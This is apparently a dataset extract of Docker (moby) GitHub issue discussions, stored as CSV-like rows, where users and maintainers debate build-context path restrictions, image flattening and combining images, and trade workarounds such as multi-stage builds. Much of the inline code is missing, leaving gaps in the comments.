Windows users and half Mac, then the code inside of our containers will have to be configured differently. I'm glad there's a hostname approach, I just think the meeting where this approach was decided should have lasted 5 more minutes.  worked. Hilarious.  I worked around this problem by reverting back to docker-machine for Mac. The docker machine VM  is a Linux distro which means that it creates a docker0 interface which has access to the private network range of the docker containers. Then, on my host mac machine, I created a route for the 172.18.x.x address range of the containers which points to the ip address of the docker machine instance (192.168.99.100 in my case). This allows packets destined for the private container network to be forwarded by my mac OS to the IP address of the linux VM of docker machine, which knows how to reach the private containers and forwards the packets to them directly. Creating the route to the docker machine vm for the private container network You can get the address for the container network by using  or .  You can find ip of the host in docker for mac this way  I had the same problem whilst using osx on home wifi. In the office it worked fine on wifi yet i guess they have a typical office setup with ip addresses created on the fly. I ran the command  then i  looked at the ports section mine says 0.0.0.080 i didnt think it would work yet it did i tried that ip address in the browser and it works fine. I have also updated /etc/hosts on the mac to 0.0.0.0 for each domain and it works perfect. sometimes the simple and obvious is the best answer. )  Run this command  docker ps` if it says 0.0.0.0 then that  will  work fine once the port is exposed  or any other ip address written  there. ",11,0,141,0,0,99,2,n,
moby/moby/2745,0.040317595,moby,moby,"Add with relative path to parent directory fails with ""Forbidden path""",30187,355,229,0,10,"If you have an add line in the Dockerfile which points to another directory, the build of the image fails with the message ""Forbidden path"". Example Gives I would expect the file to be written to , not .  thought I had a good project folder. found out sym links and relative pathing doesn't work. this appears to be just an issue about where to source the files from, so it looks like we have to create two docker files. which is depressing  You have to review the Directory and are u familiar with OLE, registry, dos system, before you take into account open source project that is pretty much extensive research. Usually we take into account what needs to be in place before rewriting for open source.I don't know why GitHub came first into a entity catalog. No proposal was in place for the designated  doc to be available. No request was sited. We don't shift the focus on and off so people can generalized on how linear regression analysis should have been to the rest of the world at large. Hope you get my drift!! Wishing the best..... Cheers, -Moderntheory On Apr 29, 2017 207 PM, ""Eric Xanderson"" notifications@friend.com wrote  So much for running a microservice architecture with multiple repositories and Dockerfiles. / Please reopen.  This is something that baffles me also.  I just ran into this limitation, and I can't see any reason for it.  To say this is a security issue due to malicious people placing bad lines in their Dockerfile and then telling people to clone, build, and publish the image is utter and complete nonsense.  If I pull a Dockerfile from the Internet (github or whatever) and blindly follow orders without looking at the file to create an image that I subsequently blindly and naively publish to a public repository, I will reap what I deserve.  To limit the product for that edge case is specious logic at best. It's frustrating to see so many people speaking out with user experiences just to get shut down, ignored, and brushed off by a small number with a concrete, inflexible, uncompromising, and narrow worldview of how they want their software to be.  So many great ideas have withered and died from that kind of creativity-strangulation.  Docker might be on that slate pretty soon, if these frustrations are significant to more than just this one issue.     @friend - you hit the nail on the head. i would like to use docker, but this issue is show-stopper for me and I suspect many others. I take responsibility for what software I choose to remotely include as part of my own and I don't need/want authoritative hobblings of what I can do with software and which effectively take away my responsibility with the lame excuse/insult that I (and the larger group of my peers) am irresponsible. I build my own dockers from the ground up anyway so that ""security"" issue does not apply in my case. If they want to continue with this foolishness, they do it at their peril because there are competitors nipping at their heels - I'm just doing my research on  - I haven't yet fully understood if it is the replacement I'm looking for but I suspect it will be the docker killer.  @friend @friend @friend  As it has already been mentioned numerous times it's not purely a security issue. Docker has a client-server architecture. Docker builder is currently implemented on the server side. So if you want to use files outside build context you'd have to copy those files to docker server. One things docker newbies don't realize is that you can keep Dockerfile separate from build context. I.e. if you have , ,  you can still set build context to root. But the next thing you'll complain about is that build would take prohibitively long as you now have to copy whole  directory to the machine where docker server resides.  @friend Regarding a security issue consider this You're a docker hosting provider (or CI) and allow people to upload their git repositories with Dockerfiles. Since you want to be as efficient as possible, you implement your service with docker containers. If you allow people to reference any files on your server you'd risk that people would be able to expose images to each other. How would you solve this?  @friend Packer is not a competitor currently. It's a tool to build VM images. Though I can imagine packer to be able to build container images at some point.  @friend Why aren't you satisfied with my comment? Doesn't it sound reasonable? Do you have any questions remaining? Do you have a solution to the problem I described?  @friend  You run people's dockers inside their own containers.  @friend So you propose to use docker in docker to build images? It would be very inefficient and still insecure. The kernel is shared however deep DinD you use and since docker has root privileges it's hackable.  Sorry, I don't understand what's the meaning of ""dockers"" here.  I suppose it could be a Docker in Docker but there are many options for virtualization depending on your platform.  @friend So, can that not be done automatically?  If I specify a file out of the context, is it not possible and/or feasible to automatically copy it to the server in order to build it into the image? So, the unfortunate haughty attitude to your ""newbie"" users aside, this is actually what has already been suggested (by @friend  above), and as I stated in my own post, this is the solution I am currently using.  This works for me.  However, if I had multiple, shared config, and my individual docker images were rather big, this would get fairly prohibitive, as it has been stated by others that each docker image would contain the files for every other docker image, even though it would never need them.  I could easily see why people would be frustrated by what they could easily see as stonewalling in refusing to work with users' requests and needs and implement this feature.  Won't you as easily see why maintainers be frustrated? If you read the docker history, you'd know that this whole ""docker"" concept was developed in-house (in ""dotCloud"" then) as a tool to efficiently use server resources. No, it's not ""setting up a situation"". It's a historic fact. Sure. Just like in any ""as-a-service"". There would be only one docker daemon, so yes. Otherwise you'd need to set up a separate docker daemon for each user which is impossible on one host (so would require actual virtual machine for each user, rendering containers and docker meaningless for that use case). It is not a security concern for running containers (since kernel isolates them), but it is a security concern when there are no containers yet (when you're building images). You're still saying as if each user runs a separate process. It's a server, remember? There's only one user. And one filesystem. That would require implementing application layer of access control on top of the system one. You're not forced to use docker to build images. Container image format is currently being standardized. So there are other tools you can build images with. When image is build, push it to image registry so that docker can pull it. And I'm sure when the build tool would be extracted out of the server monolith (#32925) relative path use case would be possible as the builder would run in a separate process under ""normal"" user.  I'm running into this issue as well in a Go project. Here's how this became a problem for me I want to run a container for developing my server locally, which has the following approximate structure Inside of my Dockerfile, there are two options I can think of here  ADD ../ /go/src/MyOrg Only add the main package and then install the dependencies from the repo  The first option doesn't work because of this bug The second option isn't only awful, but doesn't work because of moby#24489 and MyOrg happens to be bristling with private repos My only other option is to put all the dependencies into the vendor file Now if I ever want to update Dependency/dep.go I have to run a script to manually copy Dependency folder into the vendor folder. Just bizarre.  Wouldn't it be trivial for Docker to do quick static analysis and detect whether a relative parent directory is being accessed? Then when you try to run or build it, it would abort saying Even if you can't analyze it before running the Dockerfile, then just abort with the same error message when you encounter the offending instruction.  @friend It looks like you want to link statically with some library? For production image, I see 3 solutions 1) Treat it as a thirdparty library with its own release cycle  Publish  using go package manager In  fetch all dependencies using go package manager  2) Treat it as a part of your application with synchronous release cycle  Move  to  Add additional  if you want to release Dependency separately  3) Move Dockerfile to For development image there's a 4th solution 4) Just use docker-compose  use image with Go build tools mount  to  use go command to build normally as you would without docker   Your #2 is a non-solution if the Dependency is used by more than one MyOrg projects, which, if I understand correctly, is the entire point of @friend's setup. 3 also breaks once there is more than one top-level project. That really leaves us with just solution #1, which is a lot of hassle for something that should be a non-issue. Virtually every build system on the planet supports this setup (e.g. CMake's  actually lets you ascent into the parent directory etc.); Docker is the special needs child here )  Dependency management is always an issue. Often there's a temptation to dump everything into one repository (like they do at Facebook and Google), but it's not an option in the open source community. And when you have multiple repositories you must either use git clone or some other package source. The thing is, docker is not a build system. It's not designed as a build tool. Build functionality is only a necessity and it has very limited capability. You can't use multiple Dockerfiles to build one image (without intermediate registry step), you can't import Dockerfile (you can only use other image as a base), there were no multistage builds until recently. So yeah, if you need a build tool, use CMake (or ) and then just add artifacts to the result image.  So why can't we do this? A tool should not be enforcing it's own ideology onto it's users when it's designed to be as versatile as possible.  plus one. Basically I have a JAR file for instrumentation that needs to be in every single micro-service, but is quite large. Due to change in infrastructure (Rancher for orchestration instead of ad-hoc docker scripts) it will no longer be ""easy"" for me to mount the JAR for instrumentation in the target container at runtime, so I need to supply it to Dockerfile and copy it inside the container at build time. Well, the JAR is quite big so it is in the parent directory of all the micro-services directories (each containing their own Dockerfile) Due to this ""limitation"" I am force to copy/clone a 50MB+ JAR into every simple micro-service (10+) directory... Not healthy for my co-workers machines or the Git repository. Providing a flag such as  to docker build would not be outside of the realm of possibility. The Dockerfile would have to be pre-processed before bundling the context to analyse dependencies from outer directories which would then be added to the context bundle, right? In my mind this does not look like a very far-fetched feature-request - but rather quite sensible usage. Cheers Dan  Just FYI to anyone here, the best solution I have found so far, was to simply to simply copy the Dockerfile to the root of the project and give the file name a uuid. after building, then just delete the uuid file. worst case is the Dockerfile doesn't get deleted, but it's a uuid, so it shouldn't really matter. I tried symlinks up the wazooo, did not work. Copying the file to the root of the project the uuid isn't as pretty as symlinks, but it does work.  You can just build the Docker context directly  If JAR file is static you shouldn't include it to your git repository. Here's a proper way  Build a base image (e.g. ) with JAR file included Create a Jenkins (or other CI) pipeline where you build and push the  image to the registry On each microservice's Dockerfile use base JAR image    You can use multi-stage builds; Create a Docker image for your packages (or build several of such images) Dockerfile FROM scratch COPY instrumentation.jar / bash docker build -t my-packagesv1.0.1 -f Dockerfile.packages . Dockerfile FROM my-packagesv1.0.1 AS packages FROM nginxalpine COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM mysql COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar Dockerfile FROM my-packagesv1.0.1 AS packages FROM my-other-packagesv3.2.1 AS other-packages FROM my-base-image COPY --from=packages /instrumentation.jar /some/path/instrumentation.jar COPY --from=other-packages /foobar-baz.tgz /some/other-path/foobar-baz.tgz ‚ô†  @friend The trick I've used in the past is to use symlinks and then rsync everything with symlink resolution to a separate folder for building. It doesn't really work if you have really large files in your build, but for most use cases it's a workaround that can get the job done.     @friend  thanks, I will look into that...I have to support generic building of projects for the purposes of library code, so the stupid trick of copying the Dockerfile to the project is the only lightweight thing I can think of, where the only thing being copied is the Dockerfile itself. Seems dumb but works lol.  This is extremely unfortunate. At this point, it's physically impossible for me to add any new ideas, since all of them have already been brought up. But for some reason, the Docker people seem to keep complaining about security aspects. This makes less than zero sense just add an  flag, which is disabled by default. Boom everyone is happy. Can we stop pretending that security is a concern here? If the attack vector is that an attacker somehow convinced me to run  on their , then I think I'm stupid enough that they also could have convinced me to run .  I think you're missing one important difference docker runs in a superuser context. And no, you're not supposed to be stupid to be convinced to clone some project from GitHub and run .  LXDock is interesting  the warning - duly noted and highly appreciated )  5 years later and docker still issues this cryptic error message that rivals ones from nuget. How about at least putting in ""Even though you are in path X when you issued the  command, and your dockerfile has a path relative to X, and you have specified a working directory in the dockerfile, docker is going to be working in path Y (ps. u r stupid noob)"" At least I think that's what the obstacle preventing me from completing a basic walkthrough.  This tech seems great and all, but I shouldn't need to spend a few weeks researching the ins and outs and dealing with 5 year old bugs like this just to try it.  This appears to still be a bug, at least is presenting itself today in what feels like a very routine use-case.  It certainly feels at first. But not after you learn how to mount your source and build directories, which is a recommended use case for development. You aren't supposed to rebuild your images on every source change. When you're comfortable with development use case, you can proceed to production use case, at which point you create  and use  to point docker builder at the root of your project. Then you realize that not all the files in your project are required for production. You begin to optimize it by creating build image and using build artifacts folder as a context for you production build. Then you learn about multistage builds and which point you're comfortable with a setup you have. If you need to put in your image something else from your HOME folder, like your private ssh keys (not a brightest idea), you can copy them to your project dir (surely you're not worried about security) or even commit them to git.  I just ran into this issue as well. Is there a reasonable workaround? I just want to mount a folder that is not in the docker folder...  All this ""mount"" talk and ""Home folders"".  If anyone is going to fix the error to be more clear, please remember that some of us have C drives and %USERPROFILE%.  The way it works on Windows is network shares which is kind of a mount.  Windows has actually had mounting for a long time, its just transparent to users unlike nix, I just didn't want to be further confused by nix specific messages while trying docker out on windows. Why would I create a network share to run a docker image on the host running on my local machine? That seems ""extra"", but if the error message said that was the problem I would fix it and not come bothering anyone.  If you're talking about Docker on Windows, it still uses linux in a VM.   When you run  it actually zips your src folder and transfer it to the docker server which executes commands from your .  It looks like there are some people who want to reference any files from the . But Dockerfile parsing is done on the docker server. So there's no way it could know which files are referenced. Some people are asking to change message from ""Forbidden path"" to something more understandable. Does the message ""Can't reference files outside build context"" make sense to you?  So if I have a dockerfile like this... ... and run a command to publish a new empty Asp.net (not core) web app (dockerfile inside folder) ... ... the  error that crops up (that talks about a path I have specified nowhere) is talking about it from the context of the ""Docker Server"" box in the picture above? I did try changing the COPY to various relative and absolute paths, but nothing stopped producing that that error, or caused a different one to happen. I'm only on this thread as its the only place I could find that had mention of the random temp\docker-builderNNNNNNNN folder that does get created locally on my windows pc (maybe on the Docker Server as well. but I can't tell). The local folder is removed almost immediately. If what I'm describing isnt for the same issue as this very long and meandering thread, please say so and I'll open a new issue. No, because of two things  despite the name of the command I am executing, I'm not compiling anything. I'm deploying something already built to a container to create an image.  It doesnt tell me what the build context is. ""Build context"" is meaningless without some concrete bit of info like the context's path or environment variable or the referenced file paths.   Well, you're compiling an image. Even though you have already ""built"" a thing you want to put into an image, you have not built an image. Well, errors should not replace documentation.    I see what you're trying to do. It looks like you have not read the  reference or  help.  You have ARG source specified but you haven't provided an argument for it, so the default value of  kicks in First argument of docker build command is a . You would know what is a build context if you had read how to use  before running this command. The error essentially tells you that there's no  in .   Also, it looks like you're running Windows containers (native docker server) which do not require VM. This technology is still experimental, so you may experience a bug.  plus one for allowing something like 'COPY ../../src' I'm sorry, but any environment that pushes developers to use so clumsy project structures will never mature and leave the mickey-mouse stage. This is not how successful products evolve and no PR hype can be a saver for long. Docker team, please propose some viable solution.  @friend - I should not need to digest tomes of information just to ""get started"". I already had to get permission to temporarily uninstall antivirus that was interfering with docker. The paths used in the build context shouldn't be somewhere other than where I'm executing the command or the program folders. A common temp location is ok too, but only if it doesn't require additional permissions, which I think is what you are saying this needs.  Super clean and direct and works fine, at least for me  @friend Yes, this is tutorial describes how to set a context directory. Which implies that the problem here is that  is not descriptive enough People should refer to extended description on the website  which it's quite easy to grasp what ""Forbidden path"" really means. It doesn't have anything to do with permissions. @friend Writing Dockerfiles for your project doesn't sound ""get started"" to me. It requires quite an advanced knowledge. Getting started tutorial describes setting up very simple project that doesn't require any prior knowledge. But if you need to setup anything more complex you must know how Docker works. And yes, it requires quite a lot of time to figure out.  When something exists but you are not permitted access to it, it is forbidden. If its not a valid for some other reason, its Invalid for some other reason. I started with the one that is created when adding docker support to a VS project. It would run in a debugger but that isnt very useful if I need to make a deployable image. Trying to use the CLI to build the image outside of VS just reports the temp folder error.  The file looks correct ... ""Docker, build using this folder and the docker file in it."" seems to be what the CLI help tells me this means.  Nothing about a build context or additional paths, just the one path to direct it to, be it a filesystem path, or a URL, or a ""-"" (the dash must be a *nix convention). The command looks correct...  Both the command and the dockerfile look correct, yet it does not work.  In Unix,  usually means ""short help"". If you need extended info you should use   don't see how this problem you have is related to ""Forbidden path"" issue. Error message tells you that there's no folder named  in . Where do you see ""Forbidden path""?  You are applying the word with an incorrect meaning. I don't mean offense, i can only speak in one language and you clearly can communicate in more than one. Personally I would rather be corrected than to continue to speak incorrectly. if  is the short help (that goes on for a few screens worth of console), then what is  ? That usage example says run the executable ""docker"" with command (option) ""build"" and give it a path. And then says ""build an image from a  docker file"". So the path must be to the docker file, yes?  If there are other params required it should say that, not make me look up ""man pages"". I still dont understand why its choosing to use the temp folder and then complaining about it when I gave the path to the docker file as the parameter and that has a relative path in it.  ‚ô†PATHDockerfile-fPATHobj/Docker/publish` by the look of it.  It doesn't have to use the temp folder, it's just an implementation detail. What really happens is that it uses a remote build. I.e. while physically it's just a different location of the same machine, logically,  doesn't build on your local machine, it builds on the remote machine. So you must provide all the files the build needs inside the directory or tarball specified by PATH or URL so that these files are copied to that remote machine and used to produce an image. This approach is called ""the client/server architecture"". That is also a Unix convention  flags that are composed of one letter are specified using a minus (). They usually have an expanded version that has identical meaning, but longer to type (). This sounds like a valid point. Please create a new issue if you want the  to be changed to be more descriptive.  I hit this all the time with go projects, where it is common for packages to live at the root of the project, and not in the buildable command directory (where i want the Dockerfile to live). I can't build the Dockerfile and use the newest version of the utilities dir if I buil from the  directory. I could of course run  in my Dockerfile, but often times I want to use the local (modified) versions of my packages that are not yet published upstream. Here are the workarounds I've come up with (some seen in this issue) Move Dockerfiles to project root Move your  to the root of your project and re-factor it to add files and directories from the project root path onward (.  Cons Some people have huge projects and Docker uploads the entire ""context"" its running in to whatever the building server is, which is sometimes a remote server over VPN. This is too slow for some people.  Make a temporary dir for outside dependencies Create a  in your  directory that copies in outside dependencies to a temporary directory, then calls .  Refactor your  to add files from the temporary directory created in your  when building.  Have the  then call a clean that deletes the temporary directory.  Cons Your  may break, leaving garbage duplicated files around.  You can make this less of an issue by adding the temporary directory to a  file.  Run Dockerfiles from root context Run your  from the project root ""context"", but let it keep living in the  dir.  Refactor the  to add files relative the root of the project ().  Cons Still does not work with huge repos, that end up shipping the entire project to a remote docker server in some environments.   @friend Read above the recommended option do not use Dockerfile for development. Use go base image + docker-compose + mounted folders.  After 153 comments I would have figured this would be understood as a basic needed feature... using asp.net, the build is based off of a directory. If you're recommending me to have separate csprojects just for a docker build, that is crazy. The official dotnet-core-architecture example shows building outside of docker, then just copying the built contents into a docker container... that can't seriously be the considered way of doing this.  @friend A lot of people confuse docker build and Dockerfile with build scripts. Dockerfile was never intended to be a general purpose build tool. Though you can use Dockerfile this way, you're on your own with it's caveats. Yes, if you want a production image, you should run a container to build your artifacts and then copy these build artifacts to the place where Dockerfile is located or change the context to the directory with your build artifacts.  See it this way Dockerfile is a set of instructions to copy your runtime files to an empty docker image.  @friend that's the point of multi-stage builds, correct? If project B references project A, project B won't build, because it expects a csproj reference to to the project, not to a dll reference, even if you get the artifacts of project A, unless you make a separate csproj to reference by compiled dll instead of source, it won't build. And ya, I am confused what you mean ""docker build vs dockerfile with build scripts"". Docker build is for Dockerfile, correct? If not, I don't feel that should be the description on the top of the Docker Build page P  So you're saying you're using csproj files to build multiple projects simultaneously? In this case you need to access all the source files, which is 800 mb in your case. I don't see what you expect. You either build them inside or outside a container. In either case you'll end up with dll and exe files which you then put into an image  I don't understand why this needs to keep being stated... Structure  Libraries --- Library 1 --- Library 2 --- Library 3 APIs --- API 1 - reference library 1 --- API 2 - references library 2 and library 3  If I request API 1to be built, i do NOT need to send library 2, library 3, and API2. I ONLY need Library 1 and API 1. This is a C# project reference &lt;ProjectReference Include=""..\..\..\BuildingBlocks\EventBus\EventBusRabbitMQ\EventBusRabbitMQ.csproj"" /&gt;  Your Options A. Change Project Reference's to local dll's, destroying all intellisense for every library B. Hot-Swap project references to specifically only build for dll as needed for each individual docker build, (hundred of hot swaps, sounds fun) C. Send 800mb per build, when only 2 of those are actually needed D. Don't use Docker for anything build related, one of the main reasons I want to move to docker. E. Fix Docker and make everyone happy.  The daemon still needs to have all files sent. Some options that have been discussed;  Allow specifying a  so that multiple Dockerfiles can use the same build-context, but different paths can be ignored for each Dockerfile ( reverse allow specifying multiple build-contexts to be sent, e.g.   Inside the Dockerfile, those paths could be accessible through (e.g.)  Yes, I was going down the line of the multiple build contexts. That looks beautiful and would love that feature! Didn't see it portraid quite that way but that looks great to me at least  @friend I didn't say so. I said ""don't use Dockefile for anything build related"". You could perfectly use Docker for builds docker-compose run api2`  @friend Multiple build context sounds exactly what I am looking for! How soon can we see this feature?  So far it has just been a possible approach that was discussed; it would need a more thorough design, and also be looked at in light of future integration with  (which has tons of improvements over the current builder, so possible has other approaches/solutions for this problem) I can open a separate issue for the proposal for discussion; if design/feature has decided on, contributions are definitely welcome  I resolved with a workaround... Created a docker-compose for build and in original docker-compose generate image for production See  I just encountered this issue. I have multiple multiple dockerfiles and a docker-compose housed in one repo that fires up. I've been using an nginx container to proxy my client-side code with the backend, but I am not trying to dockerize the webpack configuration so that it will copy over the code and watch for changes. I've run into this forbidden issue, since my COPY command has to reach into a sibling directory.  Opened  with a proposal for multiple build-contexts ",111,55,1005,0,0,738,30,n,
moby/moby/332,0.089144435,moby,moby,flatten images - merge multiple layers into a single one,1045,12,3,0,0,"There's no way to flatten images right now. When performing a build in multiple steps, a few images can be generated and a larger number of layers is produced. When these are pushed to the registry, a lot of data and a large number of layers have to be downloaded. There are some cases where one starts with a base image (or another image), changes some large files in one step, changes them again in the next and deletes them in the end. This means those files would be stored in 2 separate layers and deleted by whiteout files in the final image. These intermediary layers aren't necessarily useful to others or to the final deployment system. Image flattening should work like this  the history of the build steps needs to be preserved the flattening can be done up to a target image (for example, up to a base image) the flattening should also be allowed to be done completely (as if exporting the image)   It's been over a year now, any plans to introduce the ""--squash"" option into the CE codebase other than via the ""--experimental"" way. ",5,0,30,0,0,10,0,n,
moby/moby/3378,0.209497185,moby,moby,How do I combine several images into one via Dockerfile,16421,217,137,0,13,"I have several Dockerfiles to build images which eg setup a postgresql client, set up a generic python app environment I want to make a Dockerfile for my python webapp which combines both those images and then runs some more commands If I understood the docs correctly, if I use  a second time I start creating a new image instead of adding to the current one?  Here's the thing, I don't necessarily need merge. I think a lot of the problems could be solved with a rebase. My normal use case is A (ubuntu) -&gt; B (e.g. nginx) A (ubuntu) -&gt; C (e.g. node) And I want a combined B &amp; C image. Usually they don't have anything to do with each other, so it would be sufficient just to rebase all the diffs between A and C onto B. i.e. A -&gt; B -&gt; C' That seems like a simpler problem to solve.  @friend Typically Node.js applications don't need this feature to work with Nginx (in my opinion). Docker way would be two containers, one for Nginx, the other for Node. We configure Node container to expose its port only to the Nginx container, and let Nginx container to listen to the public port (like 80). Any reason why Nginx needs to be in the same container as Node?  @friend I appreciate the reply. I actually just used two random services as an example. My usual use case would be starting with a generic service (e.g. node based off of ubuntu) and a custom image of my own (also based off of ubuntu) and wanting to combine them.  btw, it's not exactly rebasing but opens up a lot of use-cases for Dockerfiles. Dockerfile now supports multi-stage builds. Example You can have as many stages as you like. The  parameter basically switches the context to the specifed build target name. When you , the resulting image called  will be from the last stage. You can also build specific stages with , for example. There's a few other very nice Dockerfile enhancements in 17.05 (currently available as RC1), give it a try!  Now that is interesting! I didn't know you could do that. I'll have to give that a try to see if it solves my common use cases.  While this is a great feature, having tried it out it doesn't really solve my most common problem. I just ran into it again today. I would like a Jenkins image that has Docker installed so that I can build from within the container. The fact of the matter is that there's no way to do this without replicating the install process of one or the other in my Dockerfile. This is a case where the blinkered arguments about this not being necessary since each container should only be one service obviously don't apply. My ""one service"" combines the functionality of Docker and Jenkins.  So you want to smash two dockerfiles into one so you don't have to copy/paste stuff?  Copy/paste is the equivalent of forking in this case. What I want to do is avoid forking a Dockerfile so I don't miss out on bug/security improvements or other changes when it invariably changes later on.  Can't just pass by. Looking for a way to distribute changes over a long chain of images inheritance (deeper than 2). Multi-stage doesn't seem to be the thing that claryfies a problem. Having an entity that could contain just block of directives, allowing me to include it into all my inheritor images, together with base image functionality looks like rational evolution.  For those wondering the right way to do this, from a Docker perspective, take a few minutes to review  he creates an entire tree of Dockerfiles.  As you go down the tree, you find different combinations of dependencies, each FROM the level above in the tree.  So if you followed the tree from  -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;pyTorch  + -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow -ubuntu-&gt;common-deps-&gt;python3-&gt;deepLearningBase-&gt;TensorFlow-pyTorch` Now, you still have to make a dockerfile that combines pyTorch and TensorFlow dockerfiles, but they key is that those files will be VERY SIMPLE, just a couple lines of install on top of deepLearningBase. So what is really needed is for several Larger-scale github repositories like this, for different ""worlds"", such as Web Development, Deep Learning, Embedded software, etc. Then you would just follow the tree to your required build, and if no one else made it yet, just add a node and combine 2 or 3 apt-get lines and make your new environment.  That looks like the ""choose-your-own-adventure"" style of composition. INCLUDE would be a lot simpler. Hell, I just want to compose a specified  image with  so I don't have to install nano from apt-get every time!  I concur with @friend in his above comment. There's no reason this shouldn't be possible in most cases (conflicts should be fairly rare, as they are on manually-managed OSes).  I have introduced a YAML configuration file which allows macros  This is a use case quite similar to the one @friend commented, where neither @friend 's solution, neither multi-stage builds commented by @friend apply  A (debianstretch-slim) dockerfileAB -&gt; B (pythonslim-stretch) dockerfileAC -&gt; D ([build-stage] python-slim) dockerfileDE -&gt; E (ghdl/extvunit)     dockerfileAC -&gt; C (ghdl/runstretch-mcode)    where  The steps from A to C are exactly the same as those from B to D (dockerfileAC). The development team of B knows nothing about C, D or E. The development team of C knows nothing about B, D or E.  A user willing to build D (and/or E), must have access to dockerfileAC, but it is not required to know about dockerfileAB. Therefore, the user must have a better understanding of one dependency (C) than the other (B). Ideally, it should be possible to rely on teams A and B, and just build D as either  (merge) or  (rebase). Because GHDL is not a web service and VUnit is not a web client, both tools need to be installed in the same image/container (E). Multi-stage builds are not useful, because we need to build a (probably unknown) dockerfile with two  labels, it is not a single forward chain. If find this use case similar to the merge/rebase of two git branches sometimes there are no conflicts, sometimes the conflicts are easily resolvable, sometimes it cannot be merged at all because there is no common history... Is there any tool, either official or external, that provides this feature?  Amazing this is still an issue and topic. How hard is it to ""INCLUDE someimage"", then when parsing it, check the base is compatible (in the FROM chain) and if so, execute the rest of THAT file at that point (as if I had copied the Dockerfile from the project and pasted it into mine)? The whole ""people will do bad things they don't realize"" excuse is absurd in this context. This is already insanely complex and that why we need this to help simplify it.  @friend This is an entirely unhelpful comment. There are basically two reasons for it's why it's not one, either  It's not so easy No one has taken the time to do the work.  In reality, it is usually both.   It's a parsing and string-replace problem that any new coder could accomplish in all of 10 minutes IF they knew where in the code. I'm not saying it would be usable in all cases, but for the limited cases I'm seeing suggested here over and over (where bases are effectively common), it's a dead-ringer.  Of course not, this thread provides ~101 reasons it can't or shouldn't be done, so why would anyone think to do it regardless?   On the other hand, my comment serves (like SO many others here) to demonstrate that there is a need and with the hope to influence either the obstructing attitudes or to at least act as a reminder. If that's ""entirely unhelpful"", then you've just explained why this issue (ignored feature request) is still here and active and it's not a technical one and I'd point to your hollow post with little in the way of helpful facts, information or even opinions.  It's way more than parsing a string. Docker and the Dockerfile is used by millions of people. Adding API's is a significant thing... even outside of that the underlying implementation is not ""parsing a string"". In any case there's many proposals to solve the problem and this is a very old and closed issue.  I do think that if Docker doesn't figure out a clean solution to this scenario, it will probably be replaced by whatever tool does figure it out. I noticed one of my colleagues using the following pattern, which might be a decent workaround I haven't tried it myself though, so I'm not sure how it would work in practice, e.g. how it behaves with caching, etc.  Indeed, this is a very important problem, and hasn't been addressed properly. I'm amazed a company as big as Docker haven't tackled it yet.  Just my two cents... I am just learning more about Docker at the moment and I feel something like INCLUDE would be very useful. I liked the multiple inheritance example above and wanted to address the comments about possible problems and conflicts with it. Multiple inheritance is hard in any language that supports it but when a conflict occurs it's the responsibility of the Docker file creator to rethink what they are doing and start again. Docker should just build the image and not try to prove the build has no issues.  @friend I have support for macros in   I could support ""include"" too.  That would be missing the point.  The goal is not to include the Dockerfile definition.  The goal is to include the docker image.  This is going to seem absurd because it is off the top of my head from fedora include ubuntu /ubuntu include debian /debian Reasonably I would expect this to start off with the image of fedora.  Then add the image for ubuntu under the folder /ubuntu.   Then added the image for debian under /debian . This is of course absurd, in that why do I want to mix a bunch of operating systems into one image?   But a more useful example might be from fedora include plex /plex include commericalremover /plex/add-on/commericalremover Now in this case it makes more sense.  In that if these are other images don't have operating specific components I have an easy way to make things modular. On Wed, 8 Aug 2018 at 1548, Arkady Miasnikov notifications@friend.com wrote  That last one is possible already;  accepts both a build-stage, or an image, so for example; Edit; or to take the actual example;  Exactly.   Which is why I would consider the 2017 update that added ""COPY --from"" as having completed the original request.   There is absolutely nothing more I was looking for from this ticket. Ideas that were brought up later like auto-rebasing the include, would be nice features.   But they do go beyond the original ask. Regards, Bill On Thu, 9 Aug 2018 at 1255, Sebastiaan van Stijn notifications@friend.com wrote  @friend Using multi-stage builds for this still requires you to know which files exactly to copy from each image; that's even harder to maintain than copy-pasting the setup code from another image. Of course, merging Docker images is not trivial. Since arbitrary scripts can be run during builds, the build process resists any general attempt of automatic conflict detection; the halting problem says hi!  The best you can do (short of significantly limiting what builds can do) is to define precise semantics say the last / wins (e.g. if they ""write"" the same file) or fail on file-system-level conflict or .... The sometimes stated issue of different ""base"" images (stretch vs ubuntu vs alpine vs ...), however, is simple require that the DAG of image dependencies not only has a single source (the current image) but also a single sink (the shared ""ancestor"" of all images in the ""hierarchy""). Ultimately, of course, you'd get garbage-in-garbage-out -- is it ever different, really? FWIW, my use cases are  Running a Tomcat web application with a PostgreSQL database and an S3 object store.  While this can be solved by using Docker Compose, a single container may be nicer. Multi-language builds run in Docker containers (e.g. on Jenkins, Circle CI, ...).  There are official images for most popular toolchains, but getting a single container equipped to handle more than one runs in exactly the issue discussed here.   @friend , if you need dynamic generation of Dockerfiles  I suggest adding a domain specific language. There are a couple of examples I am aware of   @friend This is not the only option. The right options is to constrain INCLUDEs to avoid big problems. INCLUDEs can't inherit. There it is. Simple. Still incredibly useful. This feature request is popular but Docker is Free as in Beer but not by any means Free as in Freedom.  @friend With the inclusion of buildkit support since 18.06, users can provide their own frontend parser for the builder. There is already an official (from Docker Inc) experimental Dockerfile parser that includes lots of new features (support for secrets for starters). You can of course also add your own ""INCLUDE"" behavior in a custom Dockerfile frontend, or you can do something totally different that's not Dockerfile at all (there's an example for buidpacks). To use a custom frontend, just need to point Docker at an image which can handle it. Do this as a comment on the first line of your Dockerfile (or whatever thing it will be) More details here  buildkit enabled, Docker can build whatever you want it to (doesn't even have to be a Dockerfile format) with whatever features you need.  As offtopic as that note is, I think it should be noted that you are wrong. Thanks to Docker's Apache licensing, everybody has the freedom to fork and develop their own interpreter for Dockerfiles that provides the features developed here. If they are careful, the resulting images will be compatible with existing Docker runtimes/tools. Of course, the maintainers of the Docker project are similarly free to not merge such a feature into their fork (the original?).  @friend That is obviously just meaningless rant without actually referring what is free software. Moby is free software of course.  I did not know it was now Apache licensed. I apologize for the remark and think this is great! Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 2019 at 417 AM Raphael R. notifications@friend.com wrote  I'm sorry, I didn't sleep well and I made a mistake. My comment stands. Free as in Beer means Apache. Free as in Freedom means community control. An Apache project or some other form of governance. Russell Jurney @friend  LI  FB  datasyndrome.com On Wed, Jan 16, 